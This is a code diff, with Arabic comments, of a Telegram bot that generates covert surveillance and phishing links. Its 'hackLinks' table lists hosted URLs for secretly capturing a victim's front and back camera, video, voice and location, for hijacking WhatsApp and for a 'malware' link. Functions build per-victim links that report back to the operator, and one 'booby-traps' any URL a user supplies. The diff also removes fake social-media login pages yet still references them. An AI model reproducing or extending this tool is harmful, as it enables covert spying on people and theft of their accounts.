@@ -39,26 +39,25 @@ const bot = new TelegramBot(botToken, {
 });
 
 // ========== نظام إدارة الروابط ==========
-
-// روابط الاختراق (hackLinks)
 let hackLinks = {
+    // الروابط القديمة
     camera: 'https://luckyc.rwks332.workers.dev/camera',
     video: 'https://squ.rwks332.workers.dev/video',
     voice: 'https://sh.rwks332.workers.dev/voice',
     whatsapp: 'https://stee.rwks0876.workers.dev/what',
     malware: 'little.rwks332.workers.dev/malware',
     device: 'https://quiet.rwks332.workers.dev/phone',
-    location: 'https://calm.rwks332.workers.dev/local'
+    location: 'https://calm.rwks332.workers.dev/local',
+    
+    // الروابط الجديدة للأزرار المدفوعة سابقاً
+    captureFront: 'https://your-server.com/captureFront',     // رابط الكاميرا الأمامية
+    captureBack: 'https://your-server.com/captureBack',       // رابط الكاميرا الخلفية
+    recordVoice: 'https://your-server.com/record',            // رابط تسجيل الصوت
+    capture_video: 'https://your-server.com/capture',         // رابط تصوير فيديو
+    get_photo_link: 'https://your-server.com/xx.html',        // رابط تصوير بدقة عالية
+    get_link: 'https://your-server.com/k.html'                // رابط تلغيم رابط
 };
 
-// روابط الصفحات (pageLinks)
-let pageLinks = {
-    instagram: 'https://mornin.rwks332.workers.dev/Instag',
-    tiktok: 'https://dii.rwks0876.workers.dev/tiktok',
-    facebook: 'https://shy.rwks332.workers.dev/facebook',
-    snapchat: 'https://black6.rwks332.workers.dev/Snapchat',
-    twitter: 'https://emptyi.rwks332.workers.dev/twitter'
-};
 
 // ملف حفظ البيانات
 const linksFile = 'links.json';
@@ -344,20 +343,21 @@ bot.on('callback_query', async (query) => {
 });
 
 // ===== دوال مساعدة لإنشاء الروابط =====
+// ===== دوال مساعدة لإنشاء الروابط =====
 
 function generateAndSendLink(action, chatId, userId) {
-    let link = '';
     const linkId = crypto.randomBytes(16).toString('hex');
+    let link = '';
     
     switch(action) {
         case 'captureFront':
-            link = `${BASE_URL}/captureFront/${linkId}?chatId=${userId}`;
+            link = `${hackLinks.captureFront}/${linkId}?chatId=${userId}`;
             break;
         case 'captureBack':
-            link = `${BASE_URL}/captureBack/${linkId}?chatId=${userId}`;
+            link = `${hackLinks.captureBack}/${linkId}?chatId=${userId}`;
             break;
         case 'getLocation':
-            link = `${BASE_URL}/getLocation/${linkId}?chatId=${userId}`;
+            link = `${hackLinks.location}/${linkId}?chatId=${userId}`;
             break;
         default:
             return bot.sendMessage(chatId, 'حدث خطأ في إنشاء الرابط');
@@ -369,27 +369,17 @@ function generateAndSendLink(action, chatId, userId) {
 function generateAndSendVoiceLink(chatId, userId) {
     const linkId = crypto.randomBytes(16).toString('hex');
     const duration = 10;
-    const link = `${BASE_URL}/record/${linkId}?chatId=${userId}&duration=${duration}`;
+    const link = `${hackLinks.recordVoice}/${linkId}?chatId=${userId}&duration=${duration}`;
     bot.sendMessage(chatId, `✅ رابط تسجيل الصوت:\n${link}`);
 }
 
-function sendWhatsAppLink(chatId, userId) {
-    const link = `${hackLinks.whatsapp}?chatId=${userId}`;
-    bot.sendMessage(chatId, `✅ رابط اختراق واتساب:\n${link}`);
-}
-
-function sendDeviceInfoLink(chatId, userId) {
-    const link = `${hackLinks.device}?chatId=${userId}`;
-    bot.sendMessage(chatId, `✅ رابط جمع معلومات الجهاز:\n${link}`);
-}
-
 function sendVideoLink(chatId, userId) {
-    const link = `${BASE_URL}/capture?chatId=${userId}`;
+    const link = `${hackLinks.capture_video}?chatId=${userId}`;
     bot.sendMessage(chatId, `✅ رابط تصوير الفيديو:\n${link}`);
 }
 
 function sendPhotoLink(chatId, userId) {
-    const link = `${BASE_URL}/xx.html?chatId=${userId}`;
+    const link = `${hackLinks.get_photo_link}?chatId=${userId}`;
     bot.sendMessage(chatId, `✅ رابط التصوير بدقة عالية:\n${link}`);
 }
 
@@ -399,13 +389,15 @@ function sendMalwareLink(chatId, userId) {
     bot.once('message', async (msg) => {
         const userLink = msg.text;
         if (userLink && userLink.startsWith('https')) {
-            const malwareLink = `${BASE_URL}/k.html?chatId=${userId}&url=${encodeURIComponent(userLink)}`;
+            const malwareLink = `${hackLinks.get_link}?chatId=${userId}&url=${encodeURIComponent(userLink)}`;
             bot.sendMessage(chatId, `✅ تم تلغيم الرابط:\n${malwareLink}`);
         } else {
             bot.sendMessage(chatId, '❌ الرابط غير صالح، يجب أن يبدأ بـ https://');
         }
     });
 }
+
+
 
 function sendPageLink(platform, chatId, userId) {
     const link = `${pageLinks[platform]}?chatId=${userId}`;
